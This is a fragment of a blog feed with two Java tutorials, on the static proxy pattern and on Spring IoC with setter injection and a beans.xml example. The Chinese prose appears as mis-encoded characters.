<li>æˆ¿ä¸œéœ€è¦ç§Ÿå‡ºæˆ¿å­</li>
</ul>
<p>è¿™ä¸ªæ—¶å€™ä¸¤è€…ä¹‹é—´çš„åˆåŒå¾ˆçº¯ç²¹ï¼Œå¦‚æœä¸¤è€…è®¤è¯†ï¼Œå°±ä¸éœ€è¦ä¸­ä»‹ï¼Œç›´æ¥å¯¹æ¥æŠŠæˆ¿å­ç§Ÿå‡ºå»å°±å¾ˆç®€å•å¾ˆå¿«äº†å¯¹å§ï¼Ÿä½†æ˜¯ç°å®å¾€å¾€ä¸æ˜¯è¿™æ ·ï¼Œæ›´å¯èƒ½çš„æ˜¯å¦‚ä¸‹æƒ…å†µï¼š</p>
<ul>
<li>æˆ¿ä¸œå’Œå®¢æˆ·äº’ä¸ç›¸è¯†ï¼Œéœ€è¦ç­¾è®¢å„ç§åˆåŒä¿è¯å¯¹æ–¹ä¸ä¼šåæ‚”</li>
<li>ä¸€ä¸ªå®¢æˆ·è‚¯å®šä¸ä¼šåªçœ‹æˆ¿å­ï¼Œä»–éœ€è¦çœ‹å¤šä¸ªæˆ¿å­æ¥é€‰æ‹©è‡ªå·±å¿ƒä»ªçš„æˆ¿å­</li>
<li>æˆ¿ä¸œä¸å¯èƒ½æ—¶æ—¶åˆ»åˆ»éƒ½å®ˆç€æˆ¿å­ï¼Œç­‰ä¸€ä¸ªä¸€ä¸ªçš„å®¢æˆ·ä¸Šé—¨æ¥çœ‹</li>
</ul>
<p>åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œç”¨æˆ·çš„éœ€æ±‚å’Œæˆ¿ä¸œçš„å®¢æˆ·éƒ½ç›¸å½“ä¸çº¯ç²¹äº†ï¼Œéœ€è¦ç»è¿‡å¾ˆå¤šæ­¥éª¤æ‰å¯ä»¥è½¬æ¢åˆ°ä½</p>
<p><img src="%E9%9D%99%E6%80%81%E4%BB%A3%E7%90%86/image-20201109214714721.png" alt="image-20201109214714721"></p>
<p>åœ¨ç°å®ç”Ÿæ´»ä¸­ï¼Œæ­£æ˜¯ç”±äºè¿™ç§æƒ…å†µçš„å‡ºç°ï¼Œæ‰€ä»¥å‡ºç°äº†æˆ¿å±‹ä¸­ä»‹ï¼Œè§£å†³å„ç§å®¢æˆ·çš„æƒ…å†µï¼Œç”±æˆ¿å±‹ä¸­ä»‹æ¥ç»™å®¢æˆ·ä»¬è§£å†³å„ç§é—®é¢˜ï¼Œç»è¿‡ä¸­ä»‹å¤„ç†ï¼ŒåŒæ–¹çš„æƒ…å†µåˆå˜å¾—çº¯ç²¹äº†èµ·æ¥ï¼Œè€Œç¹ççš„äº‹æƒ…äº¤ç»™ä¸­ä»‹æ¥å¤„ç†å³å¯</p>
<p><img src="image-20201109214848811.png" alt="image-20201109214848811"></p>
<p>è€Œä»£ç ä¸€æ ·å¦‚æ­¤ï¼Œè¿™ç§æƒ…å†µçš„å‡ºç°å‡ ä¹å¤„å¤„å¯è§ï¼Œæ¯”å¦‚æˆ‘ä»¬å¯èƒ½éœ€è¦å¤„ç†æ•°æ®åº“ï¼Œä¸­é—´éœ€è¦å¯¹æ•°æ®è¿›è¡Œå„ç§å¤„ç†ï¼Œè¿™ç§æƒ…å†µå°±å’Œä¸Šé¢çš„åˆåŒä¸€æ ·ã€‚</p>
<p>è¯è¯´å›æ¥ï¼Œæˆ‘ä»¬å¦‚ä½•å¤„ç†ç§Ÿæˆ¿å­çš„æƒ…å†µå‘¢ï¼Ÿè¿™é‡Œæˆ‘å†™äº†ä¸€å°æ®µä»£ç æ¥åšå‡ºèŒƒä¾‹ï¼š</p>
<p>æˆ‘ä»¬å¯ä»¥å°†è¿™ä¸ªäº‹æƒ…æŠ½è±¡æˆå››ä¸ªpartï¼š</p>
<ul>
<li>å‡ºç§Ÿæˆ¿å­è¿™ä»¶äº‹æƒ…</li>
<li>è°å‡ºç§Ÿï¼Ÿ æˆ¿ä¸œ</li>
<li>è°è¦æˆ¿å­ï¼Ÿ å®¢æˆ·</li>
<li>è°æ¥å¤„ç†å¤æ‚æƒ…å†µï¼Ÿ ä¸­ä»‹</li>
</ul>
<p>åˆ†æå®Œä¹‹åæˆ‘ä»¬å¯ä»¥ç€æ‰‹äºä»£ç </p>
<p>å‡ºç§Ÿæˆ¿å­è¿™ä»¶äº‹æƒ…ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> Proxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Rent</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">rent</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æˆ¿ä¸œ:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> Proxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Host</span> <span class="keyword">implements</span> <span class="title">Rent</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">rent</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;æˆ¿ä¸œç§Ÿå‡ºæˆ¿å­&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>ä¸­ä»‹ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> Proxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyProxy</span> <span class="keyword">implements</span> <span class="title">Rent</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Host host;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">MyProxy</span><span class="params">(Host host)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.host = host;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">rent</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        seeHouse();</span><br><span class="line">        host.rent();</span><br><span class="line">        takeMoney();</span><br><span class="line">        giveMoney();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">seeHouse</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;ä¸­ä»‹å¸¦ä½ çœ‹æˆ¿å­&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">takeMoney</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;ä¸­ä»‹æ”¶ä½ é’±&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">giveMoney</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;ä¸­ä»‹ç»™é’±ç»™æˆ¿ä¸œ&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å®¢æˆ·ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> Proxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.junit.Test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyTest</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test1</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        MyProxy proxy = <span class="keyword">new</span> MyProxy(<span class="keyword">new</span> Host());</span><br><span class="line">        proxy.rent();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>åœ¨ä¸Šé¢çš„ä¾‹å­å½“ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥å‘ç°ï¼Œé™æ€ä»£ç†å¸®æˆ‘ä»¬å®Œæˆäº†å¦‚ä¸‹äº‹æƒ…ï¼š</p>
<ol>
<li>ä½¿å¾—éœ€è¦å†æ¬¡æ˜ç¡®èµ·æ¥ï¼Œæ— è®ºæ˜¯å®¢æˆ·è¿˜æ˜¯æˆ¿ä¸œï¼Œéœ€æ±‚éƒ½å˜å¾—ç›¸å½“ç®€å•</li>
<li>å¤æ‚çš„äº‹æƒ…äº¤ç»™äº†ä¸­ä»‹æ¥åš</li>
</ol>
<p>ä½†æ˜¯æˆ‘ä»¬ä¹Ÿå‘ç°äº†ä¸€ä¸ªç¼ºç‚¹ï¼š</p>
<ol>
<li>æˆ‘ä»¬çš„ä»£ç é‡æ˜æ˜¾æå‡äº†å¾ˆå¤šï¼Œç›¸æ¯”äºç›´æ¥æ·»åŠ åŠŸèƒ½</li>
<li>é™¤æ­¤ä¹‹å¤–ï¼Œå¦‚æœå®¢æˆ·å¾ˆå¤šï¼Œæˆ‘ä»¬ä¸å¾—ä¸æ‰‹åŠ¨æ·»åŠ ä¸€ä¸ªä¸ªå®¢æˆ·ï¼Œå·¥ä½œé‡æ›´å¤§äº†ã€‚</li>
</ol>
<h2 id="ç»“åˆå¢åˆ æ”¹æŸ¥äº‹åŠ¡ç†è§£"><a href="#ç»“åˆå¢åˆ æ”¹æŸ¥äº‹åŠ¡ç†è§£" class="headerlink" title="ç»“åˆå¢åˆ æ”¹æŸ¥äº‹åŠ¡ç†è§£"></a>ç»“åˆå¢åˆ æ”¹æŸ¥äº‹åŠ¡ç†è§£</h2><p>åœ¨ä¸Šé¢çš„ä¾‹å­ä¸­ï¼Œæˆ‘ä»¬å­¦ä¹ åˆ°äº†ä»£ç†æ¨¡å¼çš„ç¬¬ä¸€ä¸ªå¥½å¤„ï¼Œæ¥ä¸‹çš„ä¾‹å­å°†è¿›ä¸€æ­¥è¡¨éœ²å‡ºä¸Šé¢çš„è®¾è®¡æ¨¡å¼çš„å¥½å¤„ï¼Œå¹¶ä¸”å®ƒä¼šå±•ç°é™æ€ä»£ç†çš„ç¬¬äºŒä¸ªå¥½å¤„ï¼Œ<strong>æ·»åŠ æ–°åŠŸèƒ½è€Œä¸ä¿®æ”¹åŸæœ‰ä»£ç </strong></p>
<p>å¢åˆ æ”¹æŸ¥äº‹åŠ¡ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> Proxy2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">UserService</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">add</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">delete</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">update</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">query</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä¸šåŠ¡å®ç°ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> Proxy2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserServiceImp</span> <span class="keyword">implements</span> <span class="title">UserService</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">add</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;å¢æ·»äº†ä¸€ä¸ªæ–°ç”¨æˆ·&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">delete</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;åˆ é™¤äº†ä¸€ä¸ªç”¨æˆ·&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">update</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;æ›´æ–°äº†ä¸€ä¸ªç”¨æˆ·&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">query</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;æŸ¥è¯¢äº†ä¸€ä¸ªç”¨æˆ·&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™æ—¶å€™æˆ‘ä»¬çªç„¶æƒ³è¦æ·»åŠ æ–°åŠŸèƒ½ï¼Œæ‰“å°æˆ‘ä»¬ä½¿ç”¨äº†ä»€ä¹ˆåŠŸèƒ½æ”¹æ€ä¹ˆåŠï¼Ÿæˆ‘ä»¬å¾ˆæ˜æ˜¾å¯ä»¥è¿™æ ·åšï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">query</span><span class="params">()</span> </span>&#123;</span><br><span class="line">     System.out.println(<span class="string">&quot;ä½¿ç”¨äº†æŸ¥è¯¢åŠŸèƒ½&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;æŸ¥è¯¢äº†ä¸€ä¸ªç”¨æˆ·&quot;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>ä½†æ˜¯å¾ˆæ˜æ˜¾è¿™ç§æ–¹å¼éå¸¸ç¬¨æ‹™ï¼Œå¹¶ä¸”å¦‚æœæ˜¯æ›´å¤šçš„åŠŸèƒ½ï¼Œç¨‹åºå‘˜å°±å¿…é¡»æ‰‹å†™ï¼Œå¹¶ä¸”ä¸€æ®µä¸€æ®µçš„å¤åˆ¶å·®ä¸å¤šçš„ä»£ç ï¼ï¼ˆè¿™é‡Œå››ä¸ªè¾“å‡ºè¯­å¥å°±è®©æˆ‘æ„Ÿè§‰æœ‰ç‚¹çƒ¦èºäº†</p>
<p>æˆ‘ä»¬ç»“åˆä»£ç†æ¨¡å¼ï¼Œå…¶å®å¯ä»¥å¾ˆä¼˜é›…çš„è§£å†³å®ƒï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> Proxy2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserServiceProxy</span> <span class="keyword">implements</span> <span class="title">UserService</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> UserServiceImp userServiceImp;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setUserServiceImp</span><span class="params">(UserServiceImp userServiceImp)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.userServiceImp = userServiceImp;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">add</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        log(<span class="string">&quot;add&quot;</span>);</span><br><span class="line">        userServiceImp.add();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">delete</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        log(<span class="string">&quot;åˆ é™¤&quot;</span>);</span><br><span class="line">        userServiceImp.delete();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">update</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        log(<span class="string">&quot;æ›´æ–°&quot;</span>);</span><br><span class="line">        userServiceImp.update();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">query</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        log(<span class="string">&quot;æŸ¥è¯¢&quot;</span>);</span><br><span class="line">        userServiceImp.query();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">log</span><span class="params">(String name)</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;[DEBUG]æ‰§è¡Œäº†&quot;</span>+name+<span class="string">&quot;æ–¹æ³•&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™æ—¶å€™æˆ‘ä»¬å°±è§£å†³äº†åŠŸèƒ½çš„éœ€æ±‚ï¼Œå¹¶ä¸”ï¼Œ<strong>æˆ‘ä»¬æ²¡æœ‰ä¿®æ”¹ä»»ä½•ä¸€è¡ŒåŸä»£ç </strong>ï¼Œå´ä¸Šçº¿äº†æ–°çš„åŠŸèƒ½ï¼Œé™¤æ­¤ä¹‹å¤–ï¼Œæˆ‘ä»¬çš„ä»£ç æ‹“å±•æ€§ä¾ç„¶å¾ˆé«˜ï¼Œéœ€è¦æ·»åŠ æ–°åŠŸèƒ½åªéœ€è¦æ·»åŠ æ–°çš„ä»£ç†å±‚å³å¯ï¼Œè¿™æ—¶å€™æˆ‘ä»¬å°†å¼•å‡ºäº†ç¬¬ä¸‰ä¸ªæ€æƒ³ï¼š</p>
<p><strong>ä»»ä½•åŠŸèƒ½çš„æ·»åŠ ï¼Œä¿®æ”¹ï¼Œå¼•å…¥æ–°çš„ä»£ç†å±‚æ¥è§£å†³ï¼Œå®¢æˆ·åªéœ€è¦å»å¯¼å…¥æœ€åä¸€ä¸ªä»£ç†å¢å³å¯</strong></p>
]]></content>
      <tags>
        <tag>å¼€å‘</tag>
      </tags>
  </entry>
  <entry>
    <title>Springå­¦ä¹ </title>
    <url>/2020/11/10/Spring%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h1 id="Spring"><a href="#Spring" class="headerlink" title="Spring"></a>Spring</h1><h3 id="ä»ä»Šå¤©å¼€å§‹å­¦Sping"><a href="#ä»ä»Šå¤©å¼€å§‹å­¦Sping" class="headerlink" title="ä»ä»Šå¤©å¼€å§‹å­¦Sping"></a>ä»ä»Šå¤©å¼€å§‹å­¦Sping</h3><h5 id="1-IOCç†è®ºæ¨å¯¼ï¼š"><a href="#1-IOCç†è®ºæ¨å¯¼ï¼š" class="headerlink" title="1.IOCç†è®ºæ¨å¯¼ï¼š"></a>1.IOCç†è®ºæ¨å¯¼ï¼š</h5><ul>
<li><p>UserDaoæ¥å£</p>
</li>
<li><p>UserDaomplå®ç°ç±»</p>
</li>
<li><p>Userserviceä¸šåŠ¡æ¥å£</p>
</li>
<li><p>UserServiceimpl ä¸šåŠ¡å®ç°ç±»</p>
<p>åœ¨ä¹‹å‰çš„ä¸šåŠ¡å½“ä¸­ï¼Œç”¨æˆ·çš„éœ€æ±‚ä¼šä¿®æ”¹æˆ‘ä»¬çš„ä»£ç ï¼Œå¯¼è‡´ä»£ç éš¾ä»¥ç»´æŠ¤ï¼Œæ‰€ä»¥æˆ‘ä»¬å¼€å§‹ä½¿ç”¨äº†setå€¼æ¤å…¥ï¼Œsetæ¥å£ï¼Œå®ç°ä¸ç”¨ä¿®æ”¹ä»£ç ï¼Œç”¨æˆ·åªéœ€è¦è°ƒç”¨æ¥å£å°±å¯ä»¥äº†ã€‚</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserServiceimp1</span> <span class="keyword">implements</span> <span class="title">UserService</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> UserDao userDao = <span class="keyword">new</span> UserDaolmp1();</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">getUser</span><span class="params">()</span></span>&#123;</span><br><span class="line">        userDao.getuser();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>å…ˆå‰çš„ä»£ç ï¼Œåœ¨æˆ‘ä»¬è°ƒç”¨UserDaoçš„æ—¶å€™å› ä¸ºå†™æ­»äº†æ‹“å±•ï¼Œæ‰€ä»¥æ— æ³•çµæ´»çš„è°ƒç”¨ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨æ¥å£çš„æ€æƒ³è§£æ”¾</p>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setUserDao</span><span class="params">(UserDao userDao)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.userDao = userDao;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">getUser</span><span class="params">()</span></span>&#123;</span><br><span class="line">        userDao.getuser();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>â€‹    æˆ‘ä»¬å°†ä¹‹å‰å†™æ­»çš„ä»£ç è½¬å˜æˆäº†setæ–¹æ³•ï¼Œè¿™æ ·å­å½“æˆ‘ä»¬äºmainæ–¹æ³•å½“ä¸­ä½¿ç”¨çš„æ—¶å€™ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        UserServiceimp1 userService = <span class="keyword">new</span> UserServiceimp1();</span><br><span class="line"></span><br><span class="line">        userService.setUserDao(<span class="keyword">new</span> UserDaoMysql());</span><br><span class="line">        userService.getUser();</span><br><span class="line"><span class="comment">//        ç”¨æˆ·å®é™…è°ƒç”¨ä¸šåŠ¡å±‚ï¼Œdaoå±‚ä¸éœ€è¦æ¥è§¦</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>ç”¨æˆ·åªéœ€è¦åœ¨setåé¢æ›´æ”¹æ¥å£å°±å¯ä»¥äº†ï¼</p>
<p>IOCçš„ä¸‰å±‚æ¶æ„ï¼šDaoå±‚è´Ÿè´£å®ç°æ–¹æ³•ï¼ŒServiceå±‚è´Ÿè´£è°ƒç”¨Daoçš„æ–¹æ³•ï¼Œè€Œmainæ–¹æ³•å»è°ƒç”¨Serviceçš„æ¥å£</p>
<p>ä½¿ç”¨è¯¥æ–¹æ³•å¤§å¤§é™ä½äº†ä¸šåŠ¡çš„<strong>è€¦åˆæ€§ï¼Œ</strong>ä½¿å¾—ä¸šåŠ¡çš„æ¯ä¸€éƒ¨åˆ†ä¸“å¿ƒäºåšå¥½è‡ªå·±çš„æ¶æ„å³å¯ã€‚</p>
<p><img src="Spring%E5%AD%A6%E4%B9%A0/image-20200620165913816.png" alt="image-20200620165913816"></p>
<h5 id="2-IOCçš„æœ¬è´¨"><a href="#2-IOCçš„æœ¬è´¨" class="headerlink" title="2.IOCçš„æœ¬è´¨"></a>2.IOCçš„æœ¬è´¨</h5><p>â€‹    <strong>æ§åˆ¶åè½¬IoC</strong>(Inversion of Control),æ˜¯ä¸€ç§è®¾è®¡æ€æƒ³ï¼ŒDI(ä¾èµ–æ³¨å…¥)æ˜¯å®ç°IoCçš„ä¸€ç§æ–¹æ³•ï¼Œä¹Ÿæœ‰äººè®¤ä¸ºDIåªæ˜¯IoCçš„å¦-ç§è¯´æ³•ã€‚ æ²¡æœ‰IoCçš„ç¨‹åºä¸­ ,æˆ‘ä»¬ä½¿ç”¨é¢å‘å¯¹è±¡ç¼–ç¨‹ ,å¯¹è±¡çš„åˆ›å»º ä¸å¯¹è±¡é—´çš„ä¾èµ–å…³ç³»å®Œå…¨ç¡¬ç¼–ç åœ¨ç¨‹åºä¸­ï¼Œå¯¹è±¡çš„åˆ›å»ºç”±ç¨‹åºè‡ªå·±æ§åˆ¶ï¼Œæ§åˆ¶åè½¬åå°†å¯¹è±¡çš„åˆ›å»ºè½¬ç§»ç»™ç¬¬ä¸‰æ–¹ï¼Œä¸ªäººè®¤ä¸ºæ‰€è°“æ§åˆ¶åè½¬å°±æ˜¯:è·å¾—ä¾èµ–å¯¹è±¡çš„æ–¹å¼åè½¬äº†ã€‚</p>
<p>â€‹    è€ŒIOCå°±æ˜¯Springçš„æ ¸å¿ƒæ€æƒ³ï¼</p>
<h5 id="3-HelloSpring"><a href="#3-HelloSpring" class="headerlink" title="3.HelloSpring"></a>3.HelloSpring</h5><p>é¦–å…ˆæˆ‘ä»¬éœ€è¦åˆ›å»ºä¸€ä¸ªç±»ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloSpring</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String str;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getStr</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> str;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setStr</span><span class="params">(String str)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.str = str;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">tostring</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;hello&quot;</span>+<span class="string">&quot;str=&quot;</span>+str+<span class="string">&#x27;\&#x27;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>åˆ›å»ºbeans.xmlï¼Œå†™å…¥å¦‚ä¸‹ï¼š</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--        ä½¿ç”¨springåˆ›å»ºå¯¹è±¡ï¼Œè¿™äº›å¯¹è±¡éƒ½ç§°ä¸ºbean--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;hello&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.ysllz.pojo.HelloSpring&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;str&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Spring&quot;</span>/&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--        å±æ€§--&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>åœ¨è¿™é‡Œï¼ŒSpringå¸®æˆ‘ä»¬åšäº†è¿™ä¹ˆä¸€ä¸ªäº‹æƒ…ï¼š</p>
<p>åœ¨javaå½“ä¸­ï¼Œæˆ‘ä»¬åˆ›å»ºç±»çš„æ—¶å€™éƒ½æ˜¯ ç±» å¯¹è±¡å = new å¯¹è±¡ï¼›</p>
<p>è€Œåœ¨Springå½“ä¸­ï¼Œidä¸ºæ³¨å†Œçš„å¯¹è±¡åï¼Œpropertyå½“ä¸­å³å¯è°ƒç”¨ç±»å½“ä¸­çš„æ–¹æ³•ï¼Œvalueç”¨äºç»™æ–¹æ³•çš„å˜é‡èµ‹å€¼ã€‚</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Mytest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"><span class="comment">//        è·å–springçš„ä¸Šä¸‹æ–‡å¯¹è±¡</span></span><br><span class="line">        ClassPathXmlApplicationContext context = <span class="keyword">new</span> ClassPathXmlApplicationContext(<span class="string">&quot;beans.xml&quot;</span>);</span><br><span class="line"><span class="comment">//        æ¥ä¸‹æ¥æˆ‘ä»¬ç”¨Springçš„ç®¡ç†å³å¯</span></span><br><span class="line">        HelloSpring hello = (HelloSpring) context.getBean(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">        System.out.println(hello.tostring());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>é‡ç‚¹å°±æ˜¯ä¸€åˆ‡äº¤ç»™Springï¼Œä¸€åˆ‡å‡½æ•°ä¸å†ç”±ä½ è°ƒç”¨ï¼Œè®©Springè°ƒç”¨å³å¯ã€‚</p>
